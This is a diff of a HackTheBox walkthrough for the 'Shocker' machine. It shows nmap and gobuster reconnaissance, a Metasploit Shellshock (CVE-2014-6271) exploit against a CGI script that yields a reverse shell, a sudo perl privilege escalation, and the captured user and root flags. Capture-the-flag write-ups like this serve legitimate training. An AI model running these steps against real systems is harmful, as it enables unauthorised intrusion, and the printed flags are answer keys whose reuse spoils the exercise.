@@ -1,8 +1,10 @@
+
 # HackTheBox Walkthrough - Machine: Shocker
 
 **Target IP**: 10.129.83.111  
 **Difficulty**: Easy  
-**Objective**: Exploit the Shellshock vulnerability to gain a reverse shell and escalate privileges.
+**Objective**: Exploit the Shellshock vulnerability to gain a reverse shell and escalate privileges.  
+![webpage](img/webpage.png)
 
 ---
 
@@ -12,6 +14,7 @@ Performed an Nmap scan:
 ```bash
 nmap -sV -sC -oA nmap/Shocker 10.129.83.111
 ```
+![nmap](img/nmap.png)
 
 **Open Ports**:
 - 80/tcp (HTTP)
@@ -27,6 +30,7 @@ Used gobuster:
 ```bash
 gobuster dir -u http://10.129.83.111/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
 ```
+![gobuster](img/gobuster.png)
 
 Found:
 - `/cgi-bin/`
@@ -40,6 +44,7 @@ Found:
 ```bash
 gobuster dir -u http://10.129.83.111/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x cgi,sh,pl
 ```
+![gobuster2](img/gobuster2.png)
 
 Found script:
 - `/cgi-bin/user.sh`
@@ -48,15 +53,11 @@ Found script:
 
 ---
 
-## Task 4: The output from user.sh matches the output from what standard Linux command?
-
-_Optional Task_
-
----
-
 ## Task 5: What 2014 CVE ID describes a remote code execution vulnerability in Bash when invoked through Apache CGI?
 
-Found via Google search:
+Found via Google search:  
+![cve20146271](img/cve20146271.png)
+
 - **CVE**: `CVE-2014-6271`
 
 ---
@@ -74,6 +75,7 @@ set RHOSTS 10.129.83.111
 set TARGETURI /cgi-bin/user.sh
 run
 ```
+![meterpreter](img/meterpreter.png)
 
 Reverse meterpreter shell obtained.
 
@@ -84,6 +86,7 @@ Reverse meterpreter shell obtained.
 ```bash
 cat /home/shelly/user.txt
 ```
+![userflag](img/userflag.png)
 
 **Answer**: `90c5a327907f4c1b29b25e275757a962`
 
@@ -107,11 +110,12 @@ sudo -l
 
 ## Submit Root Flag
 
+![root](img/root.png)
+
 ```bash
 sudo perl -e 'exec "/bin/sh";'
 cat /root/root.txt
 ```
+![rootflag](img/rootflag.png)
 
 **Answer**: `bcbcf1bca3a6d0af2a7c84bbda8501e9`
-
----
